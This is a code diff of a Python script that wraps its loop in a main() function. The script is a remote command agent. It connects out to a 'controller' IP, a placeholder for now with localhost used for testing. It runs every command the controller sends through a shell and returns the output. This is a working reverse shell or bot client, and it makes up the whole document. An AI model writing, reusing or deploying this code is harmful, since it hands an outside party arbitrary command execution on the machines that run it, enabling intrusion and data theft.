@@ -10,33 +10,37 @@ FORMAT = "utf-8"
 
 HOST = "ENTER CONTROLLER IP ADDRESS HERE"
 
-while True:
-    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    SOCKET.bind((SELF, PORT))
-    #standby mode (trying to connect to the controller until successful )
-    successful = False
-    while not successful:
-        try:
-            #using this computer's IP address temporarily for testing on the same computer
-            SOCKET.connect((SELF, 5050))
-            print("connected")
-            successful = True
-        except:
-            print("no response")
-            sleep(5)
-    #active mode (executing commands from the controller)
+def main():
     while True:
-        command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
-        print(command)
-        if command[0] == "HOST_DISCONNECT":
-            SOCKET.close()
-            break
-        try:
-            output = check_output(command, shell=True)
-            if output == b'':
-                output = b' '
-            SOCKET.send(output)
-        except Exception as e:
-            SOCKET.send(bytes(str(e), FORMAT))
+        SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        SOCKET.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        SOCKET.bind((SELF, PORT))
+        
+        #standby mode (trying to connect to the controller until successful )
+        successful = False
+        while not successful:
+            try:
+                #replace with HOST after initial testing complete
+                SOCKET.connect((SELF, 5050))
+                print("connected")
+                successful = True
+            except:
+                print("no response")
+                sleep(5)
+        
+        #active mode (executing commands from the controller)
+        while True:
+            command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
+            print(command)
+            if command[0] == "HOST_DISCONNECT":
+                SOCKET.close()
+                break
+            try:
+                output = check_output(command, shell=True)
+                if output == b'':
+                    output = b' '
+                SOCKET.send(output)
+            except Exception as e:
+                SOCKET.send(bytes(str(e), FORMAT))
 
+main()
